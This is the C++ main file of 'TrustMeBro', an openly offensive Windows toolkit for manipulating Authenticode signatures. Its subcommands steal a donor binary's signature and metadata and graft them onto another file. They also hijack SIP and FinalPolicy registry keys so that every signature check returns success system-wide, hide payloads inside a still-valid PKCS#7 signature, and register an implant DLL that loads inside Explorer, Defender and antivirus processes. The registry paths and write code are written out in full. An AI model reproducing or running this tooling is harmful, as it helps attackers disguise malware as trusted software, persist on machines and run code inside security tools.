/*
 * TrustMeBro - Authenticode signature manipulation toolkit
 *
 * Subcommand-based CLI matching the Python tool's interface:
 *   steal, hijack, embed, extract, sip-exec, probe, clean
 */

#include "steal.h"
#include "pkcs7_embed.h"
#include <cstring>

// ---- GUID alias table ----
// Maps short names to SIP GUIDs for --guid flag

struct GuidAlias {
    const char* alias;
    const wchar_t* guid;
    const char* extensions;
};

static const GuidAlias GUID_ALIASES[] = {
    {"authenticode", L"{C689AAB8-8E78-11D0-8C47-00C04FC295EE}", ".exe .dll .sys .ocx"},
    {"pe",           L"{C689AAB8-8E78-11D0-8C47-00C04FC295EE}", ".exe .dll .sys .ocx"},
    {"java",         L"{C689AAB9-8E78-11D0-8C47-00C04FC295EE}", ".class"},
    {"cab",          L"{C689AABA-8E78-11D0-8C47-00C04FC295EE}", ".cab"},
    {"msi",          L"{000C10F1-0000-0000-C000-000000000046}", ".msi .msp"},
    {"ps1",          L"{603BCC1F-4B59-4E08-B724-D2C6297EF351}", ".ps1 .psm1 .psd1 .cdxml .mof"},
    {"powershell",   L"{603BCC1F-4B59-4E08-B724-D2C6297EF351}", ".ps1 .psm1 .psd1 .cdxml .mof"},
    {"jscript",      L"{06C9E010-38CE-11D4-A2A3-00104BD35090}", ".js .jse"},
    {"vbscript",     L"{1629F04E-2799-4DB5-8FE5-ACE10F17EBAB}", ".vbs .vbe"},
    {"wsf",          L"{1A610570-38CE-11D4-A2A3-00104BD35090}", ".wsf .wsc .sct"},
    {"appx",         L"{0AC5DF4B-CE07-4DE2-B76E-23C839A09FD1}", ".appx .msix"},
    {"appx-bundle",  L"{0F5F58B3-AADE-4B9A-A434-95742D92ECEB}", ".appxbundle .msixbundle"},
    {"ctl",          L"{9BA61D3F-E73A-11D0-8CD2-00C04FC295EE}", ".ctl .stl"},
    {"catalog",      L"{DE351A43-8E59-11D0-8C47-00C04FC295EE}", ".cat"},
    {"esd",          L"{9F3053C5-439D-4BF7-8A77-04F0450A1D9F}", ".esd .wim"},
    {"sac",          L"{18B3C141-AE0D-40F9-9465-E542AFC1ABC7}", "(Smart App Control, Win11)"},
    {nullptr, nullptr, nullptr}
};

const wchar_t* resolve_guid(const char* input, const char** out_ext) {
    // Try alias first
    for (int i = 0; GUID_ALIASES[i].alias; i++) {
        if (_stricmp(input, GUID_ALIASES[i].alias) == 0) {
            if (out_ext) *out_ext = GUID_ALIASES[i].extensions;
            return GUID_ALIASES[i].guid;
        }
    }
    // Treat as raw GUID
    if (out_ext) *out_ext = "(custom GUID)";
    return nullptr;
}

// ---- Help text ----

void print_main_help(const char* exe) {
    std::fprintf(stderr,
        "TrustMeBro - Authenticode signature manipulation toolkit\n\n"
        "Usage: %s <command> [options]\n\n"
        "Commands:\n"
        "  steal      Steal signature and metadata from a donor PE\n"
        "  hijack     Install SIP or FinalPolicy persistence on local or remote host\n"
        "  embed      Embed payload into a signed PE's PKCS#7 signature\n"
        "  extract    Extract embedded payload from a signed PE\n"
        "  sip-exec   Install, remove, or list implant DLLs on the SIP execution surface\n"
        "  probe      Query local CI enforcement state (HVCI, test-signing, SAC)\n"
        "  clean      Remove all persistence artifacts (SIP, FinalPolicy, certs, catalogs)\n\n"
        "Run '%s <command>' with no arguments for command-specific help.\n"
        "Run '%s <command> --help' for detailed options.\n",
        exe, exe, exe);
}

void print_steal_help(const char* exe) {
    std::fprintf(stderr,
        "Usage: %s steal <donor> <target> [options]\n\n"
        "Steal the Authenticode signature from <donor> and graft it onto <target>.\n\n"
        "Options:\n"
        "  --clone       Also clone metadata (icons, version info, manifest)\n"
        "  --no-hijack   Do not install SIP hijack (signature will not validate)\n"
        "  --sip-types   SIP types to hijack (default: PE,PowerShell,MSI)\n"
        "  --sac         Include Smart App Control SIP (Win11)\n"
        "  --all-sips    Hijack all 19 SIP GUIDs\n"
        "  --wow64-only  Write only to WOW6432Node (affects 32-bit callers)\n"
        "  --dry-run     Print what would happen without writing\n"
        "  --clean       Reverse: restore SIP keys installed by steal\n"
        "  -v            Verbose output\n",
        exe);
}

void print_hijack_help(const char* exe) {
    std::fprintf(stderr,
        "Usage: %s hijack [options]\n\n"
        "Install SIP or FinalPolicy persistence on the local machine.\n"
        "Requires admin. Changes take effect in new processes.\n\n"
        "Options:\n"
        "  --finalpolicy       Redirect WinVerifyTrust FinalPolicy to SoftpubCleanup\n"
        "  --custom-provider <GUID>  Register a custom action GUID with SoftpubCleanup\n"
        "  --sip-types <types> SIP types to hijack (default: PE,PowerShell,MSI)\n"
        "  --sac               Include Smart App Control SIP (Win11)\n"
        "  --all-sips          Hijack all 19 SIP GUIDs\n"
        "  --wow64-only        Write only to WOW6432Node (affects 32-bit callers)\n"
        "  --dry-run           Print what would happen without writing\n"
        "  --clean             Reverse: restore hijacked keys to defaults\n"
        "  -v                  Verbose output\n",
        exe);
}

void print_embed_help(const char* exe) {
    std::fprintf(stderr,
        "Usage: %s embed <payload> <signed_pe> <output> [options]\n\n"
        "Embed <payload> into <signed_pe>'s PKCS#7 signature. Output to <output>.\n"
        "The Authenticode signature remains valid after embedding.\n\n"
        "Options:\n"
        "  --camouflage     Wrap payload as fake SPC_NESTED_SIGNATURE\n"
        "  --oid <oid>      Custom OID (default: 1.3.6.1.4.1.311.99.1)\n"
        "  --signer-index N Target WIN_CERTIFICATE entry (-1 = last, 0 = first)\n"
        "  --dry-run        Show what would happen without writing\n"
        "  -v               Verbose output\n",
        exe);
}

void print_extract_help(const char* exe) {
    std::fprintf(stderr,
        "Usage: %s extract <source_pe> <output> [options]\n\n"
        "Extract embedded payload from <source_pe> to <output>.\n\n"
        "Options:\n"
        "  --camouflage     Extract from SPC_NESTED_SIGNATURE wrapper\n"
        "  --oid <oid>      OID to extract (default: 1.3.6.1.4.1.311.99.1)\n"
        "  --signer-index N WIN_CERTIFICATE entry (-1 = last, 0 = first)\n"
        "  -v               Verbose output\n",
        exe);
}

void print_sipexec_help(const char* exe) {
    std::fprintf(stderr,
        "Usage: %s sip-exec <action> [options]\n\n"
        "Install, remove, or list payload DLLs on the SIP execution surface.\n"
        "Installed DLLs load in any process that calls WinVerifyTrust.\n\n"
        "Actions:\n"
        "  install   Install a payload DLL as a SIP trigger\n"
        "  remove    Remove a previously installed SIP trigger\n"
        "  list      List all registered SIP triggers\n\n"
        "Install options:\n"
        "  --dll <path>      Full path to the payload DLL on target\n"
        "  --guid <alias>    SIP GUID or alias (pe, ps1, jscript, vbscript, ...)\n"
        "  --dry-run         Print what would happen without writing\n\n"
        "Remove options:\n"
        "  --guid <alias>    SIP GUID or alias to remove\n"
        "  --dry-run         Print what would happen without writing\n\n"
        "Shortcut: 'sip-exec --clean --guid <alias>' is the same as remove.\n\n"
        "Aliases: pe, ps1, jscript, vbscript, wsf, cab, catalog, appx, msi, ctl, esd, sac\n",
        exe);
}

void print_clean_help(const char* exe) {
    std::fprintf(stderr,
        "Usage: %s clean [options]\n\n"
        "Remove all TrustMeBro persistence artifacts from the local machine.\n\n"
        "Options:\n"
        "  --sip             Restore all SIP registry keys to defaults\n"
        "  --finalpolicy     Restore FinalPolicy to SoftpubAuthenticode\n"
        "  --custom-provider <GUID>  Remove a specific custom trust provider\n"
        "  --all             Restore SIP keys + FinalPolicy (full cleanup)\n"
        "  --dry-run         Print what would happen without writing\n"
        "  -v                Verbose output\n\n"
        "With no flags, prints this help. At least one scope flag is required.\n",
        exe);
}

void print_probe_help(const char* exe) {
    std::fprintf(stderr,
        "Usage: %s probe\n\n"
        "Query local Code Integrity enforcement state.\n"
        "Reports HVCI, test-signing, debug mode, and Smart App Control status.\n"
        "No writes. No admin required.\n",
        exe);
}

// ---- Helpers ----

void err(const char* call, LONG code, const char* msg) {
    std::fprintf(stderr, "[-] %s failed (0x%08lX): %s\n", call, code, msg);
}

// ---- main ----

int main(int argc, char* argv[]) {
    if (argc < 2) { print_main_help(argv[0]); return 1; }
    const char* cmd = argv[1];

    // Global flags consumed anywhere in argv
    bool verbose = false;
    bool dry_run = false;
    bool clean_flag = false;
    for (int i = 2; i < argc; i++) {
        if (strcmp(argv[i], "-v") == 0 || strcmp(argv[i], "--verbose") == 0) verbose = true;
        if (strcmp(argv[i], "--dry-run") == 0) dry_run = true;
        if (strcmp(argv[i], "--clean") == 0) clean_flag = true;
    }
    g_verbose = verbose;

    // ================================================================
    // steal <donor> <target> [--clone] [--no-hijack] [--sip-types] ...
    // ================================================================
    if (strcmp(cmd, "steal") == 0) {
        if (argc < 3 || (argc < 4 && !clean_flag)) { print_steal_help(argv[0]); return 1; }

        bool do_clone = false, do_hijack = true;
        bool wow64_only = false, include_sac = false, all_sips = false;
        std::string sip_types_str;
        std::string donor, target;

        // Parse positional args (skip flags)
        for (int i = 2; i < argc; i++) {
            if (argv[i][0] == '-') {
                if (strcmp(argv[i], "--clone") == 0) do_clone = true;
                else if (strcmp(argv[i], "--no-hijack") == 0) do_hijack = false;
                else if (strcmp(argv[i], "--wow64-only") == 0) wow64_only = true;
                else if (strcmp(argv[i], "--sac") == 0) include_sac = true;
                else if (strcmp(argv[i], "--all-sips") == 0) all_sips = true;
                else if (strcmp(argv[i], "--sip-types") == 0 && i+1 < argc) sip_types_str = argv[++i];
            } else {
                if (donor.empty()) donor = argv[i];
                else if (target.empty()) target = argv[i];
            }
        }

        // --clean reverses the SIP hijack installed by steal
        if (clean_flag) {
            auto sips = resolve_sip_types(sip_types_str, include_sac, all_sips);
            if (sips.empty()) { for (int i = 0; i < NUM_STANDARD_SIPS; i++) sips.push_back(ALL_STANDARD_SIPS[i]); }
            if (dry_run) { std::printf("[dry-run] Would restore %zu SIP keys to defaults\n", sips.size()); return 0; }
            cleanup_registry(sips);
            std::printf("[+] SIP persistence removed (%zu entries restored).\n", sips.size());
            return 0;
        }

        if (donor.empty() || target.empty()) { print_steal_help(argv[0]); return 1; }

        if (dry_run) {
            std::printf("[dry-run] Would steal signature from %s to %s\n", donor.c_str(), target.c_str());
            if (do_clone) std::printf("[dry-run] Would clone metadata\n");
            if (do_hijack) std::printf("[dry-run] Would install SIP hijack\n");
            return 0;
        }

        if (do_clone) {
            if (!clone_metadata(donor, target))
                std::fprintf(stderr, "[-] Metadata clone failed. Continuing with signature steal.\n");
        }

        if (!steal(donor, target)) {
            err("steal", 0, "Failed to copy certificate table.");
            return 1;
        }
        std::printf("[+] Signature stolen from \"%s\" to \"%s\"\n", donor.c_str(), target.c_str());

        if (do_hijack) {
            auto sips = resolve_sip_types(sip_types_str, include_sac, all_sips);
            if (sips.empty()) return 1;
            std::printf("[*] Installing SIP persistence for %zu type(s)\n", sips.size());
            if (!hook_registry(sips, wow64_only)) {
                err("RegCreateKeyExW", 0, "SIP hijack partially failed.");
            }
            std::printf("[+] SIP persistence installed. New processes will accept the stolen signature.\n");
            std::printf("Undo: %s steal --clean\n", argv[0]);
        }
        return 0;
    }

    // ================================================================
    // hijack [--finalpolicy] [--custom-provider GUID] [--sip-types] ...
    // ================================================================
    if (strcmp(cmd, "hijack") == 0) {
        bool do_finalpolicy = false;
        bool wow64_only = false, include_sac = false, all_sips = false;
        std::string sip_types_str, custom_guid;

        for (int i = 2; i < argc; i++) {
            if (strcmp(argv[i], "--finalpolicy") == 0) do_finalpolicy = true;
            else if (strcmp(argv[i], "--custom-provider") == 0 && i+1 < argc) custom_guid = argv[++i];
            else if (strcmp(argv[i], "--wow64-only") == 0) wow64_only = true;
            else if (strcmp(argv[i], "--sac") == 0) include_sac = true;
            else if (strcmp(argv[i], "--all-sips") == 0) all_sips = true;
            else if (strcmp(argv[i], "--sip-types") == 0 && i+1 < argc) sip_types_str = argv[++i];
        }

        // --clean reverses the hijack
        if (clean_flag) {
            bool did_something = false;
            if (do_finalpolicy) {
                if (dry_run) { std::printf("[dry-run] Would restore FinalPolicy\n"); }
                else { cleanup_finalpolicy(); std::printf("[+] FinalPolicy restored.\n"); did_something = true; }
            }
            if (!custom_guid.empty()) {
                std::wstring wguid(custom_guid.begin(), custom_guid.end());
                if (dry_run) { std::wprintf(L"[dry-run] Would remove custom provider %ls\n", normalize_provider_guid(wguid).c_str()); }
                else { cleanup_custom_provider(wguid); std::wprintf(L"[+] Custom provider removed: %ls\n", normalize_provider_guid(wguid).c_str()); did_something = true; }
            }
            if (!do_finalpolicy && custom_guid.empty()) {
                auto sips = resolve_sip_types(sip_types_str, include_sac, all_sips);
                if (sips.empty()) { for (int j = 0; j < NUM_STANDARD_SIPS; j++) sips.push_back(ALL_STANDARD_SIPS[j]); }
                if (dry_run) { std::printf("[dry-run] Would restore %zu SIP keys\n", sips.size()); }
                else { cleanup_registry(sips); std::printf("[+] SIP persistence removed (%zu entries).\n", sips.size()); did_something = true; }
            }
            if (did_something) std::printf("[!] Restart affected processes for changes to take effect.\n");
            return 0;
        }

        // No flags at all: print help
        if (!do_finalpolicy && custom_guid.empty() && sip_types_str.empty() && !include_sac && !all_sips) {
            print_hijack_help(argv[0]);
            return 1;
        }

        if (do_finalpolicy) {
            if (dry_run) {
                std::printf("[dry-run] Would redirect FinalPolicy to SoftpubCleanup\n");
                return 0;
            }
            if (!hijack_finalpolicy()) { err("RegCreateKeyExW", 0, "FinalPolicy write failed."); return 1; }
            std::printf("[+] FinalPolicy hijacked. All signature checks return success.\n");
            std::printf("[!] Stolen signatures show verified publisher (Subject CN from cert).\n");
            std::printf("[!] System-wide. Affects all processes. Survives reboot.\n");
            std::printf("Undo: %s hijack --finalpolicy --clean\n", argv[0]);
            return 0;
        }

        if (!custom_guid.empty()) {
            std::wstring wguid(custom_guid.begin(), custom_guid.end());
            if (dry_run) {
                std::wprintf(L"[dry-run] Would register custom provider %ls with SoftpubCleanup\n",
                             normalize_provider_guid(wguid).c_str());
                return 0;
            }
            if (!hijack_custom_provider(wguid)) { err("RegCreateKeyExW", 0, "Custom provider write failed."); return 1; }
            std::wstring norm = normalize_provider_guid(wguid);
            std::wprintf(L"[+] Custom trust provider registered: %ls\n", norm.c_str());
            std::printf("Undo: %s hijack --custom-provider %s --clean\n", argv[0], custom_guid.c_str());
            return 0;
        }

        // Default: SIP hijack
        auto sips = resolve_sip_types(sip_types_str, include_sac, all_sips);
        if (sips.empty()) return 1;

        if (dry_run) {
            std::printf("[dry-run] Would hijack %zu SIP type(s):", sips.size());
            for (auto& s : sips) std::wprintf(L" %ls", s.name);
            std::printf("\n");
            if (wow64_only) std::printf("[dry-run] WOW64-only mode\n");
            return 0;
        }

        std::printf("[*] Installing SIP persistence for %zu type(s):", sips.size());
        for (auto& s : sips) std::wprintf(L" %ls", s.name);
        std::printf("\n");
        if (wow64_only) std::printf("[!] WOW64-only: 32-bit callers hijacked, 64-bit registry untouched.\n");

        if (!hook_registry(sips, wow64_only)) {
            err("RegCreateKeyExW", 0, "Some SIP keys failed to write.");
        }
        std::printf("[+] SIP persistence installed. New processes affected.\n");
        std::printf("Undo: %s hijack --clean\n", argv[0]);
        return 0;
    }

    // ================================================================
    // embed <payload> <signed_pe> <output> [--camouflage] [--oid] ...
    // ================================================================
    if (strcmp(cmd, "embed") == 0) {
        if (argc < 5) { print_embed_help(argv[0]); return 1; }
        std::string payload_path = argv[2], signed_pe = argv[3], output = argv[4];
        bool camouflage = false;
        std::string oid = "1.3.6.1.4.1.311.99.1";
        int signer_index = -1;

        for (int i = 5; i < argc; i++) {
            if (strcmp(argv[i], "--camouflage") == 0) camouflage = true;
            else if (strcmp(argv[i], "--oid") == 0 && i+1 < argc) oid = argv[++i];
            else if (strcmp(argv[i], "--signer-index") == 0 && i+1 < argc) signer_index = atoi(argv[++i]);
        }

        if (dry_run) {
            std::printf("[dry-run] Would embed %s into %s -> %s (camouflage=%s, oid=%s)\n",
                        payload_path.c_str(), signed_pe.c_str(), output.c_str(),
                        camouflage ? "yes" : "no", oid.c_str());
            return 0;
        }

        if (!pkcs7::embed(signed_pe, payload_path, output, oid, camouflage, verbose)) return 1;
        // ponytail: signer_index support requires pkcs7_embed.h multi-entry API (Python has it, C++ deferred)
        (void)signer_index;
        return 0;
    }

    // ================================================================
    // extract <source_pe> <output> [--camouflage] [--oid] ...
    // ================================================================
    if (strcmp(cmd, "extract") == 0) {
        if (argc < 4) { print_extract_help(argv[0]); return 1; }
        std::string source = argv[2], output = argv[3];
        bool camouflage = false;
        std::string oid = "1.3.6.1.4.1.311.99.1";

        for (int i = 4; i < argc; i++) {
            if (strcmp(argv[i], "--camouflage") == 0) camouflage = true;
            else if (strcmp(argv[i], "--oid") == 0 && i+1 < argc) oid = argv[++i];
        }

        if (!pkcs7::extract(source, output, oid, camouflage, verbose)) return 1;
        return 0;
    }

    // ================================================================
    // sip-exec install|remove|list [--dll] [--guid] [--dry-run]
    // ================================================================
    if (strcmp(cmd, "sip-exec") == 0) {
        if (argc < 3 && !clean_flag) { print_sipexec_help(argv[0]); return 1; }

        // --clean on sip-exec acts as "remove"
        const char* action = (argc >= 3 && argv[2][0] != '-') ? argv[2] : (clean_flag ? "remove" : nullptr);
        if (!action) { print_sipexec_help(argv[0]); return 1; }

        std::string dll_path, guid_input;
        for (int i = (action == argv[2] ? 3 : 2); i < argc; i++) {
            if (strcmp(argv[i], "--dll") == 0 && i+1 < argc) dll_path = argv[++i];
            else if (strcmp(argv[i], "--guid") == 0 && i+1 < argc) guid_input = argv[++i];
        }

        if (strcmp(action, "install") == 0) {
            if (dll_path.empty()) {
                std::fprintf(stderr, "[-] --dll is required for sip-exec install.\n");
                print_sipexec_help(argv[0]);
                return 1;
            }
            if (guid_input.empty()) guid_input = "pe";

            const char* extensions = nullptr;
            const wchar_t* resolved = resolve_guid(guid_input.c_str(), &extensions);
            std::wstring wguid;
            if (resolved) {
                wguid = resolved;
            } else {
                // Treat as raw GUID
                wguid = std::wstring(guid_input.begin(), guid_input.end());
                if (wguid.front() != L'{') wguid.insert(wguid.begin(), L'{');
                if (wguid.back() != L'}') wguid.push_back(L'}');
                extensions = "(custom GUID)";
            }

            std::wstring dll_w(dll_path.begin(), dll_path.end());
            // CryptSIPDllIsMyFileType2 registration path
            std::wstring subkey = L"SOFTWARE\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllIsMyFileType2\\";
            subkey += wguid;

            if (dry_run) {
                std::printf("[dry-run] Would install payload DLL as SIP trigger\n");
                std::wprintf(L"  GUID:       %ls", wguid.c_str());
                if (resolved) std::printf(" (alias: %s)", guid_input.c_str());
                std::printf("\n");
                std::printf("  Triggers:   %s\n", extensions);
                std::printf("  Payload:    %s\n", dll_path.c_str());
                std::printf("  Loads in:   Any process calling WinVerifyTrust on matching files\n");
                return 0;
            }

            // Write registry: Dll and FuncName
            // ponytail: reuse SetRegistryValues with the internal function name
            if (!SetRegistryValues(HKEY_LOCAL_MACHINE, subkey.c_str(), dll_w.c_str(), L"IsMyFileType2", KEY_WOW64_64KEY)) {
                err("RegCreateKeyExW", 0, "Failed to install SIP trigger.");
                return 1;
            }

            std::printf("[+] Implant installed on SIP execution surface.\n");
            std::wprintf(L"    GUID:       %ls", wguid.c_str());
            if (resolved) std::printf(" (alias: %s)", guid_input.c_str());
            std::printf("\n");
            std::printf("    Triggers:   %s\n", extensions);
            std::printf("    Payload:    %s\n", dll_path.c_str());
            std::printf("    Loads in:   Any process calling WinVerifyTrust on matching files\n");
            std::printf("    Affected:   Explorer, SmartScreen, Defender, certutil, signtool, AV\n");
            std::printf("Undo: %s sip-exec remove --guid %s\n", argv[0], guid_input.c_str());
            return 0;
        }

        if (strcmp(action, "remove") == 0) {
            if (guid_input.empty()) {
                std::fprintf(stderr, "[-] --guid is required for sip-exec remove.\n");
                return 1;
            }
            const wchar_t* resolved = resolve_guid(guid_input.c_str(), nullptr);
            std::wstring wguid = resolved ? resolved : std::wstring(guid_input.begin(), guid_input.end());
            if (wguid.front() != L'{') wguid.insert(wguid.begin(), L'{');
            if (wguid.back() != L'}') wguid.push_back(L'}');

            std::wstring subkey = L"SOFTWARE\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllIsMyFileType2\\";
            subkey += wguid;

            if (dry_run) {
                std::wprintf(L"[dry-run] Would remove SIP trigger: %ls\n", wguid.c_str());
                return 0;
            }

            LONG result = RegDeleteTreeW(HKEY_LOCAL_MACHINE, subkey.c_str());
            if (result != ERROR_SUCCESS && result != ERROR_FILE_NOT_FOUND) {
                err("RegDeleteTreeW", result, "Failed to remove SIP trigger.");
                return 1;
            }
            std::wprintf(L"[+] SIP trigger removed: %ls\n", wguid.c_str());
            return 0;
        }

        if (strcmp(action, "list") == 0) {
            HKEY hKey;
            std::wstring base = L"SOFTWARE\\Microsoft\\Cryptography\\OID\\EncodingType 0\\CryptSIPDllIsMyFileType2";
            if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, base.c_str(), 0, KEY_READ | KEY_WOW64_64KEY, &hKey) != ERROR_SUCCESS) {
                std::fprintf(stderr, "[-] Failed to open SIP registry.\n");
                return 1;
            }
            DWORD index = 0;
            wchar_t name[256];
            DWORD nameLen;
            std::printf("%-42s  %-30s  %s\n", "GUID", "DLL", "Function");
            std::printf("%-42s  %-30s  %s\n", "----", "---", "--------");
            while (true) {
                nameLen = 256;
                if (RegEnumKeyExW(hKey, index++, name, &nameLen, nullptr, nullptr, nullptr, nullptr) != ERROR_SUCCESS)
                    break;
                HKEY sub;
                std::wstring subpath = base + L"\\" + name;
                if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, subpath.c_str(), 0, KEY_READ | KEY_WOW64_64KEY, &sub) == ERROR_SUCCESS) {
                    wchar_t dll[512] = {0}, func[256] = {0};
                    DWORD dllSz = sizeof(dll), funcSz = sizeof(func);
                    RegQueryValueExW(sub, L"Dll", nullptr, nullptr, (BYTE*)dll, &dllSz);
                    RegQueryValueExW(sub, L"FuncName", nullptr, nullptr, (BYTE*)func, &funcSz);
                    std::wprintf(L"%-42ls  %-30ls  %ls\n", name, dll, func);
                    RegCloseKey(sub);
                }
            }
            RegCloseKey(hKey);
            return 0;
        }

        print_sipexec_help(argv[0]);
        return 1;
    }

    // ================================================================
    // probe
    // ================================================================
    if (strcmp(cmd, "probe") == 0) {
        // NtQuerySystemInformation(SystemCodeIntegrityInformation)
        typedef struct {
            ULONG Length;
            ULONG CodeIntegrityOptions;
        } SYSTEM_CODEINTEGRITY_INFORMATION;

        typedef LONG (WINAPI *pNtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);
        auto NtQSI = (pNtQuerySystemInformation)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
        if (!NtQSI) { std::fprintf(stderr, "[-] NtQuerySystemInformation not found.\n"); return 1; }

        SYSTEM_CODEINTEGRITY_INFORMATION ci = {};
        ci.Length = sizeof(ci);
        LONG status = NtQSI(0x67 /*SystemCodeIntegrityInformation*/, &ci, sizeof(ci), nullptr);
        if (status != 0) { err("NtQuerySystemInformation", status, "CI query failed."); return 1; }

        ULONG f = ci.CodeIntegrityOptions;
        std::printf("[*] Code Integrity Flags: 0x%08lX\n\n", f);
        std::printf("  CI Enabled:              %s\n", (f & 0x01) ? "YES" : "no");
        std::printf("  Test-Signing:            %s\n", (f & 0x02) ? "YES (test certs accepted)" : "no");
        std::printf("  UMCI (User-Mode CI):     %s\n", (f & 0x04) ? "YES" : "no");
        std::printf("  Debug Mode:              %s\n", (f & 0x08) ? "YES" : "no");
        std::printf("  Flight Signing:          %s\n", (f & 0x20) ? "YES" : "no");
        std::printf("  HVCI (Memory Integrity): %s\n", (f & 0x100) ? "YES" : "no");
        std::printf("  HVCI Strict:             %s\n", (f & 0x200) ? "YES" : "no");
        std::printf("  Smart App Control:       %s\n", (f & 0x2000) ? "YES" : "no");
        std::printf("  Audit Mode:              %s\n", (f & 0x800) ? "YES" : "no");
        return 0;
    }

    // ================================================================
    // clean [--sip] [--finalpolicy] [--custom-provider GUID] [--all]
    // ================================================================
    if (strcmp(cmd, "clean") == 0) {
        bool do_sip = false, do_fp = false, do_all = false;
        std::string custom_guid;

        for (int i = 2; i < argc; i++) {
            if (strcmp(argv[i], "--sip") == 0) do_sip = true;
            else if (strcmp(argv[i], "--finalpolicy") == 0) do_fp = true;
            else if (strcmp(argv[i], "--custom-provider") == 0 && i+1 < argc) custom_guid = argv[++i];
            else if (strcmp(argv[i], "--all") == 0) do_all = true;
        }

        if (!do_sip && !do_fp && !do_all && custom_guid.empty()) {
            print_clean_help(argv[0]);
            return 1;
        }

        if (do_all) { do_sip = true; do_fp = true; }

        if (do_sip) {
            // Clean all 19 SIPs
            std::vector<SipEntry> all;
            for (int i = 0; i < NUM_STANDARD_SIPS; i++) all.push_back(ALL_STANDARD_SIPS[i]);
            all.push_back(SAC_SIP);
            all.push_back(WIN11_SIP);

            if (dry_run) {
                std::printf("[dry-run] Would restore %zu SIP registry keys to defaults\n", all.size());
            } else {
                cleanup_registry(all);
                std::printf("[+] SIP registry keys restored to defaults (%zu entries).\n", all.size());
            }
        }

        if (do_fp) {
            if (dry_run) {
                std::printf("[dry-run] Would restore FinalPolicy to SoftpubAuthenticode\n");
            } else {
                cleanup_finalpolicy();
                std::printf("[+] FinalPolicy restored to SoftpubAuthenticode.\n");
            }
        }

        if (!custom_guid.empty()) {
            std::wstring wguid(custom_guid.begin(), custom_guid.end());
            if (dry_run) {
                std::wprintf(L"[dry-run] Would remove custom provider %ls\n", normalize_provider_guid(wguid).c_str());
            } else {
                cleanup_custom_provider(wguid);
                std::wprintf(L"[+] Custom provider removed: %ls\n", normalize_provider_guid(wguid).c_str());
            }
        }

        if (!dry_run) std::printf("[!] Restart affected processes for changes to take effect.\n");
        return 0;
    }

    // Unknown command
    std::fprintf(stderr, "[-] Unknown command: %s\n\n", cmd);
    print_main_help(argv[0]);
    return 1;
}
